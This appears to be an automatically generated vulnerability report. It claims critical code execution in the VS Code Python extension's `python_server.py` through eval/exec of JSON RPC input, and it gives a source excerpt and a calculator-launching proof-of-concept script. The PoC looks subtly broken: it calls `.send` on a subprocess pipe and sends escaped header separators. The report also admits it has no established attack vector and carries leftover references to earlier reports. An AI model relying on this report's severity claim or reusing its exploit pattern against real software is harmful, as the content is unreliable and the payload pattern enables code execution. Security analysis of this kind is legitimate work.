## Vulnerability List for Python extension for Visual Studio Code

### Arbitrary Code Execution via `python_server.py` `execute` method
- Description: The `python_server.py` script executes arbitrary Python code provided in JSON RPC requests via its `execute` method. An attacker who can send crafted JSON RPC requests to this server can achieve arbitrary code execution.
    1. An attacker crafts a JSON RPC request with the method "execute".
    2. The attacker includes malicious Python code within the "params" field of the request.
    3. The attacker sends this crafted JSON RPC request to the `python_server.py`.
    4. The `python_server.py` receives the request and, within the `execute` function, uses `eval` or `exec` to execute the Python code from the "params" field.
- Impact: Arbitrary Code Execution. An attacker can execute arbitrary Python code on the machine where `python_server.py` is running, with the privileges of the process running the server. This can lead to full system compromise, data exfiltration, and other malicious activities.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations: No. The code directly uses `eval` and `exec` to process user-provided input without any sanitization or sandboxing. The provided files (`/code/src/test/multiRootWkspc/workspace1/file.py`, `/code/src/test/multiRootWkspc/parent/child/file.py`, `/code/src/test/multiRootWkspc/parent/child/childFile.py`, `/code/src/test/multiRootWkspc/workspace2/file.py`, `/code/src/test/multiRootWkspc/workspace2/workspace2File.py`, `/code/src/test/multiRootWkspc/workspace3/file.py`, `/code/src/test/pythonFiles/dummy.py`, `/code/requirements.txt`) do not show any mitigation for this vulnerability. These files are related to testing, dependency management, and do not include changes to the core server code.
- Missing Mitigations: The `execute` method and the `exec_user_input` functions in `python_server.py` must be redesigned to avoid using `eval` and `exec` on user-provided input. If code execution is necessary, a secure and restricted execution environment or a completely different approach should be implemented. Input validation is insufficient to mitigate this vulnerability.
- Preconditions: An attacker must be able to send JSON RPC messages to the `python_server.py`. The exact mechanism by which an external attacker can send these requests to the `python_server.py` needs further investigation to fully define the attack vector. Based on previous analysis and files like `unittestadapter/pvsc_utils.py`, `vscode_pytest/__init__.py`, `vscode_pytest/run_pytest_script.py` and `testing_tools/socket_manager.py` from earlier project files, the communication happens over named pipes or sockets. If an attacker can somehow influence the pipe name or socket address used for communication, or if there's any exposed endpoint listening for JSON RPC requests, this vulnerability can be exploited. It is assumed that the VS Code extension is the intended client for `python_server.py`, but without proper authentication or authorization, other processes could potentially send requests.
- Source Code Analysis:
    ```python
    def exec_function(user_input): # Defines function to choose between eval and exec
        try:
            compile(user_input, "<stdin>", "eval") # Attempts to compile as eval
        except SyntaxError:
            return exec # If SyntaxError, returns exec
        return eval # Otherwise returns eval

    def execute(request, user_globals): # Handles 'execute' method requests
        # ... (IO redirection setup) ...
        with redirect_io("stdout", str_output):
            with redirect_io("stderr", str_error):
                with redirect_io("stdin", str_input):
                    exec_user_input(request["params"], user_globals) # Calls exec_user_input to execute code

    def exec_user_input(user_input, user_globals): # Executes user provided code
        user_input = user_input[0] if isinstance(user_input, list) else user_input # Extracts user input from request
        try:
            callable = exec_function(user_input) # Determines if eval or exec should be used
            retval = callable(user_input, user_globals) # Executes user input using eval or exec
            if retval is not None:
                print(retval)
        except KeyboardInterrupt:
            print(traceback.format_exc())
        except Exception:
            print(traceback.format_exc())

    if __name__ == "__main__": # Main server loop
        while not STDIN.closed:
            try:
                headers = get_headers() # Reads headers
                content_length = int(headers.get("Content-Length", 0)) # Gets content length from header
                if content_length:
                    request_text = STDIN.read(content_length) # Reads the request body
                    request_json = json.loads(request_text) # Parses JSON request
                    if request_json["method"] == "execute": # Checks if method is 'execute'
                        execute(request_json, USER_GLOBALS) # Calls execute function if method is 'execute'
                    # ... (other methods) ...
            except Exception:
                print_log(traceback.format_exc())
    ```
    The source code analysis from previous report is still valid. The newly provided files are related to testing and dependency management and do not contain the `python_server.py` code or any changes that would mitigate this vulnerability. Therefore, the analysis remains unchanged.
- Security Test Case:
    1. Save the following Python code to a file named `test_server.py`:
    ```python
    import sys
    import json
    import socket
    import subprocess

    def send_message(socket, msg):
        length_msg = len(msg)
        socket.send(f"Content-Length: {length_msg}\\r\\n\\r\\n{msg}".encode(encoding="utf-8"))

    def create_execute_request(code):
        return {
            "jsonrpc": "2.0",
            "id": "1",
            "method": "execute",
            "params": [code]
        }

    if __name__ == "__main__":
        server_process = subprocess.Popen([sys.executable, "python_server.py"], # Replace with actual path if needed
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            cwd="python_files") # Assuming python_server.py is in python_files dir
        client_socket = server_process.stdin

        malicious_code_windows = "import os; os.system('calc.exe')"
        malicious_code_mac_linux = "import os; os.system('xcalc' if sys.platform != 'darwin' else 'open /Applications/Calculator.app')" # Using xcalc for linux for wider applicability

        request_payload_windows = create_execute_request(malicious_code_windows)
        request_payload_mac_linux = create_execute_request(malicious_code_mac_linux)

        if sys.platform == 'win32':
            send_message(client_socket, json.dumps(request_payload_windows))
        else:
            send_message(client_socket, json.dumps(request_payload_mac_linux))

        client_socket.flush()
        server_process.wait(timeout=5) # Wait for server to process, with timeout

        # Check for calculator or xcalc process to verify execution (more robust verification would be needed in real test)
        print("Malicious code sent. Check if calculator (or xcalc on linux) opened.")
    ```
    2. Ensure that `python_server.py` and `test_server.py` are in the same directory (or adjust paths in `test_server.py` accordingly). Also ensure `xcalc` is installed on linux if testing on linux.
    3. Run `python test_server.py`.
    4. Observe if the calculator application (calc.exe on Windows, Calculator.app on macOS, or xcalc on linux) opens. If it does, it confirms arbitrary code execution vulnerability in `python_server.py`.
    5. If the calculator opens, the vulnerability is confirmed.
